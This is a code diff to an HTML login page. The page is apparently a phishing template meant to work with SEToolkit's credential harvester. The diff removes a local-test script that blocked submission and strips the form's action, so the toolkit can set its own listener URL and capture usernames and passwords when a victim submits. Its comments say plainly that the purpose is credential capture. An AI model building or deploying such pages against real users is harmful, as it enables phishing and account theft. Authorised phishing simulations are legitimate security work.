@@ -38,11 +38,11 @@
 
         <!-- Login Form -->
         <!--
-          NOTE: The form action is set to a placeholder '#' for display purposes.
-          When using this with SEToolkit, the toolkit will dynamically handle the POST submission
-          and capture the credentials before the server responds.
+          NOTE: This form is now passive and designed to work directly with SEToolkit.
+          SEToolkit will automatically set the 'action' attribute to its own listener URL
+          and capture the credentials when the user clicks 'Log In Securely'.
         -->
-        <form id="login-form" method="POST" action="#" onsubmit="handleFormSubmission(event)">
+        <form id="login-form" method="POST">
             <div class="space-y-6">
                 <!-- Username/Email Field -->
                 <div>
@@ -80,46 +80,10 @@
             </div>
         </form>
 
-        <!-- Footer Links / Message Box -->
+        <!-- Footer Links -->
         <div class="mt-8 text-center">
-            <p id="message-box" class="text-sm text-gray-400">
-                For security purposes, this page only accepts standard form submissions.
-            </p>
             <a href="#" class="text-sm text-indigo-400 hover:text-indigo-300 transition duration-150 mt-2 block">Forgot Password?</a>
         </div>
     </div>
-
-    <script>
-        // Simple client-side message box handler (replaces alert() for better UX)
-        function handleFormSubmission(event) {
-            // When using SEToolkit, the toolkit server intercepts the form POST request
-            // before this client-side JavaScript runs the submission prevention logic.
-            // This prevents the page from navigating away in a local test environment.
-            event.preventDefault();
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const messageBox = document.getElementById('message-box');
-
-            if (username && password) {
-                // In a real scenario, SEToolkit captures the data here.
-                messageBox.innerHTML = `<strong>Submission successful!</strong> If you were using a credential harvester, the data (User: ${username}) would have been captured. Redirecting...`;
-                messageBox.classList.remove('text-gray-400');
-                messageBox.classList.add('text-green-400', 'font-bold');
-
-                // Simulate a redirect after a delay (e.g., to the real site's home page)
-                setTimeout(() => {
-                    // You would replace location.href = '/' with a link to the real application's home page
-                    // This creates a smoother user experience in an actual testing scenario.
-                    // location.href = 'https://www.google.com'; // Example redirect
-                    messageBox.innerHTML = 'You have been redirected.';
-                }, 2000);
-            } else {
-                messageBox.innerHTML = 'Please fill out both the username and password fields.';
-                messageBox.classList.remove('text-gray-400');
-                messageBox.classList.add('text-red-400', 'font-bold');
-            }
-        }
-    </script>
 </body>
 </html>
